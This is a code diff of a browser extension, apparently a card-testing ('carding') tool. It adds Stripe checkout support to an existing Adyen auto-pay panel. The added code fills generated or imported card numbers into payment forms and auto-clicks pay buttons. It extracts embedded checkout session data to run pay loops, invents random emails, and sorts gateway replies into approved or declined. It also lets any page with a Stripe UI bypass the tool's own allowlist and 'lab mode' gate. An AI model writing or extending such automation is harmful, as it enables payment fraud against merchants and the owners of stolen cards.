@@ -69,7 +69,7 @@
     });
   }
 
-  const VERSION = "1.10";
+  const VERSION = "1.12";
 
   function gateSessionUrl(rawUrl, lab) {
     const u = String(rawUrl || "");
@@ -105,6 +105,7 @@
     if (/(^|\.)adyen\.(com|link)/.test(h)) {
       return lab || /checkoutshopper-test\.adyen\.com/.test(h);
     }
+    if (/(^|\.)stripe\.(com|network)/.test(h)) return true;
     if (isPrivateHost(h)) return true;
     let host = "";
     try { host = new URL(h).hostname; } catch (e) { return false; }
@@ -297,6 +298,13 @@
     if (!d || !d.body) return;
     capturedResps.push({ at: Date.now(), url: d.url || "", status: d.status, body: String(d.body) });
     if (capturedResps.length > 60) capturedResps.shift();
+    if (window.__nonoInbuiltScan) {
+      const t = (d.url || "").toLowerCase();
+      if (t.indexOf("sessions") !== -1 && t.indexOf("setup") !== -1) {
+        try { clearTimeout(window.__nonoInbuiltTimer); } catch (x) {}
+        window.__nonoInbuiltTimer = setTimeout(() => window.__nonoInbuiltScan(), 400);
+      }
+    }
   });
 
   function parseAdyenResp(body) {
@@ -316,9 +324,99 @@
     }
   }
 
+  function parseStripeResp(body) {
+    try {
+      const j = JSON.parse(body);
+      if (!j || typeof j !== "object") return null;
+      const err = j.error || null;
+      const pi = j.payment_intent || j.intent || j.setup_intent || null;
+      const out = {};
+      out.message = (err && err.message) || "";
+      out.decline = (err && err.decline_code) || "";
+      out.code = (err && err.code) || "";
+      out.status = (pi && pi.status) || j.status || "";
+      out.action = (pi && pi.next_action && pi.next_action.type) || "";
+      out.redirect = (pi && pi.next_action && pi.next_action.redirect_to_url && pi.next_action.redirect_to_url.url) || "";
+      if (!out.message && !out.decline && !out.status && !out.action && !out.redirect) return null;
+      return out;
+    } catch (e) {
+      return null;
+    }
+  }
+
+  function randomEmail() {
+    const d = "gmail.com";
+    return "us" + Math.floor(1000 + Math.random() * 9000) + new Date().getTime().toString().slice(-3) + "@" + d;
+  }
+
+  function stripeUISignal() {
+    if (/(^|\.)stripe\.(com|network)/.test(location.hostname)) return true;
+    const f = Array.from(document.querySelectorAll("iframe")).some((x) =>
+      /stripe\.(com|network)/.test(x.src || "") || (x.name || "").indexOf("__privateStripeFrame") === 0
+    );
+    if (f) return true;
+    const html = document.documentElement ? document.documentElement.innerHTML : "";
+    if (/__privateStripeFrame|payment-element|stripe-form|hosted-payment-sheet|data-testid=["']card/.test(html)) return true;
+    return false;
+  }
+
   function lastRespSince(ts) {
     for (let i = capturedResps.length - 1; i >= 0; i--) {
       if (capturedResps[i].at >= ts) return capturedResps[i];
+    }
+    return null;
+  }
+
+  function findInbuiltFromCaptured() {
+    for (let i = capturedResps.length - 1; i >= 0; i--) {
+      const rec = capturedResps[i];
+      const u = String(rec.url || "");
+      if (!/\/sessions\//.test(u)) continue;
+      let body = null;
+      try { body = JSON.parse(rec.body); } catch (e) {}
+      if (!body || typeof body !== "object") continue;
+      const sd = body.sessionData || (body.session && body.session.sessionData) || "";
+      if (!sd) continue;
+      const sm = u.match(/\/sessions\/([A-Za-z0-9_-]+)/);
+      const sessionId = sm ? sm[1] : "";
+      let clientKey = "";
+      try { clientKey = new URL(u).searchParams.get("clientKey") || ""; } catch (e) {}
+      clientKey = clientKey || body.clientKey || "";
+      let origin = "";
+      try { origin = new URL(u).origin; } catch (e) {}
+      const payUrl = (origin && sessionId)
+        ? origin + "/checkoutshopper/v1/sessions/" + sessionId + "/payments" +
+          (clientKey ? "?clientKey=" + encodeURIComponent(clientKey) : "")
+        : u;
+      return {
+        sessionId: sessionId,
+        clientKey: clientKey,
+        sessionData: sd,
+        browserInfo: body.browserInfo || null,
+        payUrl: payUrl,
+        origin: origin,
+        rawUrl: u
+      };
+    }
+    return null;
+  }
+
+  async function extractInbuiltSession() {
+    const local = findInbuiltFromCaptured();
+    if (local) return Object.assign(local, {
+      payUrl: local.payUrl || local.rawUrl || ""
+    });
+    const g = await proxyMsg({ action: "INBUILT_SESSION" });
+    if (g && g.found) {
+      return {
+        sessionId: g.sessionId || "",
+        clientKey: g.clientKey || "",
+        sessionData: g.sessionData || "",
+        browserInfo: null,
+        payUrl: g.payUrl || "",
+        origin: g.origin || "",
+        rawUrl: g.rawUrl || g.payUrl || ""
+      };
     }
     return null;
   }
@@ -386,13 +484,15 @@
   function classifyField(el) {
     const s = ((el.id || "") + " " + (el.name || "") + " " +
       (el.getAttribute("aria-label") || "") + " " +
+      (el.getAttribute("placeholder") || "") + " " +
       (el.getAttribute("data-fieldtype") || "") + " " +
+      (el.getAttribute("data-elements-stable-field-name") || "") + " " +
       (el.getAttribute("autocomplete") || "") + " " +
       (typeof el.className === "string" ? el.className : "")).toLowerCase();
-    if (/(card\s*[-_ ]*number|ccnum|cc[-_ ]number|\bpan\b|encrypted\w*(number|pan))/.test(s)) return "number";
-    if (/(expiry|expiration)[-_ ]*(month)?|encrypted\w*month|expmonth/.test(s) && !/year/.test(s)) return "month";
-    if (/(expiry|expiration)[-_ ]*year|encrypted\w*year|expyear/.test(s) || (/exp/.test(s) && /year/.test(s))) return "year";
-    if (/(cvc|cvv|csc|security)[-_ ]*(code)?/.test(s)) return "cvc";
+    if (/(card\s*[-_ ]*number|cardnumber|ccnum|cc[-_ ]number|\bpan\b|enter your card number|encrypted\w*(number|pan))/.test(s)) return "number";
+    if (/(expiry|expiration)[-_ ]*(month)?|cardexpiry(month)?|encrypted\w*month|expmonth/.test(s) && !/year/.test(s)) return "month";
+    if (/(expiry|expiration)[-_ ]*year|cardexpiryyear|encrypted\w*year|expyear/.test(s) || (/exp/.test(s) && /year/.test(s))) return "year";
+    if (/(cvc|cvv|csc|security)[-_ ]*(code)?|cardcvc|cardcvcfront|security code|encryptedcvc/.test(s)) return "cvc";
     return null;
   }
 
@@ -576,6 +676,21 @@
         }
       }
     }
+
+    const srsp = changes["stripe_resp"];
+    if (srsp && srsp.newValue && isTop) {
+      const r = srsp.newValue;
+      if (r.body && r.body.length > 4) {
+        capturedResps.push({ at: Date.now(), url: r.url || "", status: 200, body: String(r.body) });
+        if (capturedResps.length > 60) capturedResps.shift();
+        const info = parseStripeResp(r.body);
+        if (info) {
+          window.__nonoResult && window.__nonoResult("&#128225;",
+            "RESP " + (info.decline ? info.decline + " " : "") + (info.code ? info.code + " " : "") +
+            (info.message || info.status || info.action || "?"), "#c9b8ff");
+        }
+      }
+    }
   });
 
   function adyenUISignal() {
@@ -590,7 +705,7 @@
       const r = fillOwned(pendingCard);
       report("nono_ff", { tick: currentTick, fields: r.fields, any: r.any });
     }
-    if (!modalStarted && adyenUISignal()) {
+    if (!modalStarted && (adyenUISignal() || stripeUISignal())) {
       modalStarted = true;
       if (!document.getElementById("nono-panel")) init();
       getConfig().then((cfg) => {
@@ -600,6 +715,9 @@
             window.__nonoLog && window.__nonoLog("Adyen UI appeared — auto start.");
             b.click();
           }
+        }
+        if (cfg && cfg.autoInbuilt && window.__nonoInbuiltScan) {
+          window.__nonoInbuiltScan();
         }
       });
     }
@@ -651,22 +769,28 @@
       "button, [role='button'], a, input[type='submit'], input[type='button']"
     ));
     let adyenBtn = null;
+    let stripeBtn = null;
     for (const b of buttons) {
       const rect = b.getBoundingClientRect();
       if (rect.width === 0 && rect.height === 0) continue;
+      const cls = (typeof b.className === "string" ? b.className : "") + " " + (b.id || "") + " " + (b.getAttribute("data-testid") || "");
       const text = ((b.innerText || "") + " " + (b.getAttribute("aria-label") || "")).trim().toLowerCase();
-      if (/adyen-checkout__button/.test(b.className || "")) {
+      if (/adyen-checkout__button/.test(cls)) {
         adyenBtn = adyenBtn || b;
       }
-      if (/^(pay|pay now|pay \$?\d|proceed to pay|confirm|submit|place order)/i.test(text)) {
+      if (/hosted-payment-submit-button|stripe-payment-element|pay-button|submit-button/.test(cls)) {
+        stripeBtn = stripeBtn || b;
+      }
+      if (/^(pay|pay now|pay \$?\d|proceed to pay|confirm|submit|place order|complete purchase|continue)/i.test(text)) {
         return b;
       }
       if (/pay/i.test(text) && text.length < 40 && b.offsetParent) {
         adyenBtn = adyenBtn || b;
       }
     }
+    if (stripeBtn && !stripeBtn.disabled) return stripeBtn;
     if (adyenBtn && !adyenBtn.disabled) return adyenBtn;
-    return adyenBtn;
+    return adyenBtn || stripeBtn;
   }
 
   function waitPayEnabled(timeout) {
@@ -705,7 +829,27 @@
       "BTNS " + JSON.stringify(out).slice(0, 700), "#8fa3b5");
   }
 
+  function execPay() {
+    return new Promise((resolve) => {
+      try {
+        chrome.runtime.sendMessage({ action: "FF_PAY" }, (res) => {
+          if (chrome.runtime.lastError || !res) {
+            resolve({ clicked: [], detected: false, submitting: false });
+            return;
+          }
+          resolve(res);
+        });
+      } catch (e) {
+        resolve({ clicked: [], detected: false, submitting: false });
+      }
+    });
+  }
+
   async function tryPayHard(card) {
+    const xp = await execPay();
+    if (xp && xp.submitting) return true;
+    await sleep(400);
+
     let ok = await submitClick(6);
     if (ok) return true;
 
@@ -784,7 +928,8 @@
     const good = [
       "thank you", "payment successful", "payment complete", "approved",
       "processing", "redirecting", "almost done", "your payment was made",
-      "payment succeeded", "success", "payment received"
+      "payment succeeded", "success", "payment received",
+      "thanks for your purchase", "your purchase has been completed", "payment complete"
     ];
     for (const g of good) {
       if (all.includes(g)) return { ok: true, label: "PROCESSED" };
@@ -794,7 +939,11 @@
       "not supported", "no sufficient", "insufficient", "invalid number",
       "cannot be used", "rejected", "failed", "do not honor",
       "card number is invalid", "security code is incorrect", "card expired",
-      "payment not successful", "please try again"
+      "payment not successful", "please try again", "card was declined",
+      "your card has expired", "security code is incomplete", "cvc is incorrect",
+      "incorrect cvc", "card has insufficient funds", "insufficient funds",
+      "cannot authenticate", "could not be authenticated", "restart this payment",
+      "card number is incorrect", "try again later"
     ];
     for (const b of bad) {
       if (all.includes(b)) return { ok: false, label: b.toUpperCase() };
@@ -823,7 +972,7 @@
         <div style="display:flex;align-items:center;gap:8px">
           <span style="font-size:16px">&#9889;</span>
           <b style="font-size:13px;letter-spacing:.5px">ADYEN AUTO-PAY</b>
-          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.10</span>
+          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.12</span>
         </div>
         <div style="display:flex;gap:6px">
           <button id="nono-dbg" title="Debug DOM" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:10px;line-height:1;font-weight:700">DBG</button>
@@ -913,6 +1062,34 @@
             <button id="nono-cs-pay" style="flex:1;padding:10px;background:linear-gradient(135deg,#2f8cff,#1b5fd8);color:#fff;border:none;border-radius:9px;font-weight:700;font-size:12px;cursor:pointer">&#9654; OPEN &amp; PAY</button>
             <span id="nono-cs-status" style="font-size:10px;color:#8fa3b5">sandbox only</span>
           </div>
+
+          <div style="display:flex;flex-direction:column;gap:6px;margin-top:4px;padding:8px;background:#0d141c;border:1px solid #1a2632;border-radius:9px">
+            <div style="display:flex;gap:6px;align-items:center">
+              <button id="nono-inbuilt-pay" style="flex:1;padding:9px;background:linear-gradient(135deg,#9b59b6,#6c3483);color:#fff;border:none;border-radius:8px;font-weight:700;font-size:11px;cursor:pointer">&#9678; EXTRACT INBUILT + PAY</button>
+              <button id="nono-inbuilt-clear" title="Clear captured inbuilt session" style="padding:9px 10px;background:#3a2230;color:#ff7d7d;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer">X</button>
+            </div>
+            <div style="display:flex;justify-content:space-between;align-items:center;gap:6px">
+              <span id="nono-inbuilt-status" style="font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">waiting for embedded Adyen session…</span>
+              <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer;font-size:10px;flex-shrink:0">
+                <input type="checkbox" id="nono-autoinbuilt" style="width:auto;accent-color:#9b59b6"> Auto</label>
+            </div>
+          </div>
+
+          <div style="display:flex;flex-direction:column;gap:6px;margin-top:4px;padding:8px;background:#0d1117;border:1px solid #2d3350;border-radius:9px">
+            <div style="display:flex;align-items:center;gap:6px">
+              <span style="font-size:11px;font-weight:800;color:#635bff;letter-spacing:.5px">STRIPE</span>
+              <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer;font-size:10px">
+                <input type="checkbox" id="nono-autostripe" style="width:auto;accent-color:#635bff"> Auto</label>
+              <span id="nono-stripe-status" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">link / inbuilt mode</span>
+            </div>
+            <input id="nono-stripe-url" type="text" placeholder="https://buy.stripe.com/... (hosted payment link)"
+              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:11px;outline:none">
+            <div style="display:flex;gap:6px;align-items:center">
+              <input id="nono-email" type="text" placeholder="email (empty = random)"
+                style="flex:1;width:auto;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:11px;outline:none">
+              <button id="nono-stripe-open" style="padding:8px 10px;background:linear-gradient(135deg,#635bff,#4f46e5);color:#fff;border:none;border-radius:8px;font-size:10px;font-weight:700;cursor:pointer">OPEN + HIT</button>
+            </div>
+          </div>
         </div>
 
         <div style="display:flex;justify-content:space-between;font-size:11px;margin-top:2px">
@@ -1001,9 +1178,13 @@
         bin: el("#nono-bin").value.trim(),
         combo: el("#nono-combo").value.trim(),
         holder: el("#nono-holder").value.trim(),
+        email: el("#nono-email") ? el("#nono-email").value.trim() : "",
+        stripeUrl: el("#nono-stripe-url") ? el("#nono-stripe-url").value.trim() : "",
         cardLength: parseInt(el("#nono-len").value, 10) || 16,
         autoSubmit: el("#nono-autosubmit").checked,
         autoOnLoad: el("#nono-autoonload").checked,
+        autoInbuilt: el("#nono-autoinbuilt") ? el("#nono-autoinbuilt").checked : false,
+        autoStripe: el("#nono-autostripe") ? el("#nono-autostripe").checked : false,
         enabled: true
       };
       setConfig(cfg);
@@ -1056,9 +1237,17 @@
     el("#nono-bin").addEventListener("input", savePanelState);
     el("#nono-combo").addEventListener("input", savePanelState);
     el("#nono-holder").addEventListener("input", savePanelState);
+    el("#nono-email").addEventListener("input", savePanelState);
+    el("#nono-stripe-url").addEventListener("input", savePanelState);
     el("#nono-len").addEventListener("change", savePanelState);
     el("#nono-autosubmit").addEventListener("change", savePanelState);
     el("#nono-autoonload").addEventListener("change", savePanelState);
+    el("#nono-stripe-url").addEventListener("input", stripeAutoRun);
+    el("#nono-autostripe").addEventListener("change", () => {
+      savePanelState();
+      stripeSet(el("#nono-autostripe").checked ? "auto armed" : "manual", el("#nono-autostripe").checked ? "#635bff" : "#8fa3b5");
+      if (el("#nono-autostripe").checked) stripeAutoScan(true);
+    });
 
     el("#nono-start").addEventListener("click", startHit);
     el("#nono-stop").addEventListener("click", () => {
@@ -1351,6 +1540,153 @@
       logMsg("Pay loop stopped.");
     }
 
+    const inbuiltStatus = proxyEl("#nono-inbuilt-status");
+    let lastInbuiltKey = "";
+    let inbuiltAutoActive = false;
+    function inbuiltSet(status, color) {
+      if (inbuiltStatus) {
+        inbuiltStatus.textContent = status;
+        inbuiltStatus.style.color = color || "#8fa3b5";
+      }
+    }
+
+    function inbuiltSessionKey(sess) {
+      return (sess.sessionId || "") + "|" + (sess.clientKey || "") + "|" + String(sess.sessionData || "").slice(-12);
+    }
+
+    async function runInbuiltSession(sess, lab, force) {
+      if (!sess || !sess.sessionData || !sess.payUrl) {
+        inbuiltSet(force ? "no embedded session found" : "", force ? "#ffd166" : "#8fa3b5");
+        return;
+      }
+      const g = gateSessionUrl(sess.payUrl, lab);
+      if (!g.ok) {
+        inbuiltSet("REFUSED — " + g.reason, "#ff5d5d");
+        logMsg("Inbuilt session refused (live Adyen). Lab mode unlocks sims, Chief.");
+        return;
+      }
+      sess.rawUrl = sess.payUrl;
+      const key = inbuiltSessionKey(sess);
+      if (!force && key === lastInbuiltKey) return;
+      lastInbuiltKey = key;
+      if (csUrlEl) csUrlEl.value = sess.payUrl;
+      inbuiltSet("session " + (sess.sessionId || "?").slice(0, 10) + " armed — paying…", "#00d1b2");
+      logMsg("Inbuilt session extracted — direct pay loop starting.");
+      runCheckshopperPay(sess, lab);
+    }
+
+    async function inbuiltAutoScan(force) {
+      if (csRunning || running) return;
+      const cfg = await getConfig();
+      if (!force && !(cfg && cfg.autoInbuilt)) return;
+      if (!(cfg && (cfg.combo || cfg.bin))) {
+        if (force) inbuiltSet("need BIN/combo", "#ffd166");
+        return;
+      }
+      const lab = await getLab();
+      const sess = await extractInbuiltSession();
+      runInbuiltSession(sess, lab, force);
+    }
+
+    if (proxyEl("#nono-inbuilt-pay")) {
+      proxyEl("#nono-inbuilt-pay").addEventListener("click", async () => {
+        await attachCapture();
+        injectHook();
+        await inbuiltAutoScan(true);
+      });
+    }
+    if (proxyEl("#nono-inbuilt-clear")) {
+      proxyEl("#nono-inbuilt-clear").addEventListener("click", async () => {
+        lastInbuiltKey = "";
+        if (csUrlEl) csUrlEl.value = "";
+        capturedResps = [];
+        await proxyMsg({ action: "CLEAR_CAPTURED" });
+        inbuiltSet("capture cleared", "#8fa3b5");
+        logMsg("Inbuilt capture cleared.");
+      });
+    }
+    if (proxyEl("#nono-autoinbuilt")) {
+      proxyEl("#nono-autoinbuilt").addEventListener("change", () => {
+        savePanelState();
+        inbuiltAutoActive = proxyEl("#nono-autoinbuilt").checked;
+        inbuiltSet(inbuiltAutoActive ? "auto-scan armed" : "manual only", inbuiltAutoActive ? "#9b59b6" : "#8fa3b5");
+        if (inbuiltAutoActive) inbuiltAutoScan(true);
+      });
+    }
+
+    window.__nonoInbuiltScan = () => inbuiltAutoScan(true);
+    setInterval(() => { inbuiltAutoScan(false); }, 3000);
+    getConfig().then((cfg) => {
+      if (cfg && cfg.autoInbuilt) {
+        inbuiltAutoActive = true;
+        inbuiltSet("auto-scan armed", "#9b59b6");
+        setTimeout(() => inbuiltAutoScan(true), 600);
+      }
+    });
+
+    const stripeStatus = proxyEl("#nono-stripe-status");
+    function stripeSet(status, color) {
+      if (stripeStatus) {
+        stripeStatus.textContent = status;
+        stripeStatus.style.color = color || "#8fa3b5";
+      }
+    }
+
+    async function stripeAutoScan(force) {
+      if (running || csRunning) return;
+      const cfg = await getConfig();
+      if (!force && !(cfg && cfg.autoStripe)) return;
+      if (!(cfg && (cfg.combo || cfg.bin))) return;
+      if (!stripeUISignal()) {
+        stripeSet(force ? "no stripe ui here" : "", force ? "#ffd166" : "#8fa3b5");
+        return;
+      }
+      stripeSet("stripe armed — hitting…", "#635bff");
+      logMsg("Stripe detected — auto hit starting, Chief.");
+      savePanelState();
+      injectHook();
+      attachCapture();
+      startHit();
+    }
+
+    function stripeAutoRun() {
+      clearTimeout(window.__nonoStripeOpenTimer);
+      window.__nonoStripeOpenTimer = setTimeout(async () => {
+        const cfg = await getConfig();
+        if (cfg && cfg.stripeUrl && /(buy|checkout|pay)\.stripe\.[a-z]+/.test(cfg.stripeUrl)) {
+          stripeSet("opening link…", "#635bff");
+          chrome.storage.local.set({ nonoStripePending: true });
+          proxyMsg({ action: "STRIPE_OPEN", url: cfg.stripeUrl }).then(() => {
+            stripeSet("link opened — hit runs there", "#00d1b2");
+          });
+        }
+      }, 700);
+    }
+
+    if (proxyEl("#nono-stripe-open")) {
+      proxyEl("#nono-stripe-open").addEventListener("click", () => {
+        const cfg = savePanelState();
+        if (!cfg.stripeUrl || !/(buy|checkout|pay)\.stripe\./.test(cfg.stripeUrl)) {
+          stripeSet("paste a payment link first", "#ffd166");
+          logMsg("Paste a Stripe payment link (buy.stripe.com / checkout.stripe.com), Chief.");
+          return;
+        }
+        stripeSet("opening link…", "#635bff");
+        chrome.storage.local.set({ nonoStripePending: true });
+        proxyMsg({ action: "STRIPE_OPEN", url: cfg.stripeUrl }).then((r) => {
+          stripeSet(r && r.ok ? "link opened — hit runs there" : "open failed", r && r.ok ? "#00d1b2" : "#ff5d5d");
+        });
+      });
+    }
+
+    setInterval(() => { stripeAutoScan(false); }, 3000);
+    getConfig().then((cfg) => {
+      if (cfg && cfg.autoStripe) {
+        stripeSet("auto armed", "#635bff");
+        setTimeout(() => stripeAutoScan(true), 800);
+      }
+    });
+
     if (proxyEl("#nono-cs-pay")) {
       proxyEl("#nono-cs-pay").addEventListener("click", async () => {
         const txt = proxyEl("#nono-cs-url").value;
@@ -1421,7 +1757,7 @@
         return;
       }
       getLab().then((lab) => {
-        if (!hostAllowed(location.href, lab)) {
+        if (!hostAllowed(location.href, lab) && !stripeUISignal()) {
           logMsg("Blocked — page not allowlisted. Enable Lab mode to unlock.");
           return;
         }
@@ -1501,11 +1837,13 @@
       } else if (cfg.combo) {
         const p = parseCombo(cfg.combo);
         card = { number: p.number, month: p.month, year: p.year, cvc: p.cvc, holder: cfg.holder || "JOHN DOE" };
+        card.email = cfg.email || randomEmail();
       } else {
         card = window.CardGen.genCard(cfg.bin.replace(/\s/g, ""), { length: cfg.cardLength || 16 });
         card.holder = cfg.holder || "JOHN DOE";
         card.month = card.expiryMonth;
         card.year = card.expiryYear;
+        card.email = cfg.email || randomEmail();
       }
       pendingCard = card;
 
@@ -1536,7 +1874,17 @@
       }
 
       const resp = lastRespSince(hitStart);
-      let respInfo = resp ? parseAdyenResp(resp.body) : null;
+      let respInfo = null;
+      let respProvider = "";
+      if (resp) {
+        const sp = parseStripeResp(resp.body);
+        if (sp) {
+          respInfo = sp;
+          respProvider = "stripe";
+        } else {
+          respInfo = parseAdyenResp(resp.body);
+        }
+      }
 
       const dtTick = Date.now() + Math.floor(Math.random() * 1000);
       currentTick = dtTick;
@@ -1546,13 +1894,25 @@
 
       let res = detectResult(dt.texts);
       if (respInfo) {
-        const code = (respInfo.resultCode || respInfo.action || "").toLowerCase();
-        const isGood = /authorised|pending|redirectshopper|challenge|threeds|: challenge|otp|await/.test(code);
-        res = {
-          ok: isGood,
-          label: "API " + (respInfo.resultCode || respInfo.action || "?") +
-            (respInfo.refusalReason ? " | " + respInfo.refusalReason : "")
-        };
+        if (respProvider === "stripe") {
+          const status = (respInfo.status || "").toLowerCase();
+          const action = (respInfo.action || "").toLowerCase();
+          const isGood = /succeeded|processing|requires_action|redirect/.test(status + action) ||
+            /\bredirect\b/.test(respInfo.redirect);
+          res = {
+            ok: isGood,
+            label: (respInfo.decline ? respInfo.decline + " | " : "") +
+              (respInfo.message || respInfo.status || respInfo.action || "RESP")
+          };
+        } else {
+          const code = (respInfo.resultCode || respInfo.action || "").toLowerCase();
+          const isGood = /authorised|pending|redirectshopper|challenge|threeds|: challenge|otp|await/.test(code);
+          res = {
+            ok: isGood,
+            label: "API " + (respInfo.resultCode || respInfo.action || "?") +
+              (respInfo.refusalReason ? " | " + respInfo.refusalReason : "")
+          };
+        }
       }
       if (!res) {
         if (!st.any) res = { ok: false, label: "FIELDS NOT FOUND" };
@@ -1563,8 +1923,10 @@
       window.__nonoUpdate && window.__nonoUpdate();
 
       const respTail = respInfo
-        ? " | " + (respInfo.resultCode || respInfo.action || "")
-        + (respInfo.refusalReason ? " " + respInfo.refusalReason : "")
+        ? " | " + (respProvider === "stripe"
+          ? (respInfo.decline || respInfo.code || respInfo.status || respInfo.message || respInfo.action || "")
+          : (respInfo.resultCode || respInfo.action || "")
+          + (respInfo.refusalReason ? " " + respInfo.refusalReason : ""))
         : "";
 
       if (res.ok) {
@@ -1616,7 +1978,7 @@
       hostOk = hostAllowed(location.href, lab);
       const panel = document.getElementById("nono-panel");
       const blocked = document.getElementById("nono-blocked");
-      if (hostOk || adyenUISignal()) {
+      if (hostOk || adyenUISignal() || stripeUISignal()) {
         removeBlockedNotice();
         if (!panel) init();
       } else {
@@ -1633,7 +1995,7 @@
     if (!isTop) return;
     const lab = await getLab();
     hostOk = hostAllowed(location.href, lab);
-    if (!hostOk && !adyenUISignal()) {
+    if (!hostOk && !adyenUISignal() && !stripeUISignal()) {
       if (looksAdyenish(location.href)) buildBlockedNotice();
       return;
     }
@@ -1645,13 +2007,40 @@
     if (comboCountEl) comboCountEl.textContent = importedCombos.length + " combos";
     const cfg = await getConfig();
     if (cfg) {
-      const ids = ["nono-bin", "nono-combo", "nono-holder", "nono-len", "nono-autosubmit", "nono-autoonload"];
-      const vals = [cfg.bin || "", cfg.combo || "", cfg.holder || "", String(cfg.cardLength || 16), !!cfg.autoSubmit, !!cfg.autoOnLoad];
+      const ids = ["nono-bin", "nono-combo", "nono-holder", "nono-email", "nono-stripe-url", "nono-len", "nono-autosubmit", "nono-autoonload"];
+      const vals = [cfg.bin || "", cfg.combo || "", cfg.holder || "", cfg.email || "", cfg.stripeUrl || "", String(cfg.cardLength || 16), !!cfg.autoSubmit, !!cfg.autoOnLoad];
       ids.forEach((id, i) => {
         const e = document.getElementById(id);
         if (e) {
           if (e.type === "checkbox") e.checked = vals[i];
           else e.value = vals[i];
+        }
+      });
+      const ib = document.getElementById("nono-autoinbuilt");
+      if (ib) ib.checked = !!cfg.autoInbuilt;
+      const ist = document.getElementById("nono-autostripe");
+      if (ist) ist.checked = !!cfg.autoStripe;
+      chrome.storage.local.get("nonoStripePending", (res) => {
+        if (res && res.nonoStripePending) {
+          chrome.storage.local.remove("nonoStripePending");
+          const st = document.getElementById("nono-stripe-status");
+          if (st) { st.textContent = "pending — hitting…"; st.style.color = "#635bff"; }
+          setTimeout(async () => {
+            const h = await getLab();
+            if (!hostAllowed(location.href, h) && !stripeUISignal()) {
+              if (st) st.textContent = "link opened — add BIN, then OPEN + HIT";
+              return;
+            }
+            const cfg2 = await getConfig();
+            if (!(cfg2 && (cfg2.combo || cfg2.bin))) {
+              if (st) st.textContent = "need BIN/combo on the panel";
+              logMsg("Stripe link open — fill the card inputs above then hit START / OPEN + HIT, Chief.");
+              return;
+            }
+            injectHook();
+            attachCapture();
+            startHit();
+          }, 3500);
         }
       });
       if (cfg.enabled && cfg.autoOnLoad && !autoScheduled) {
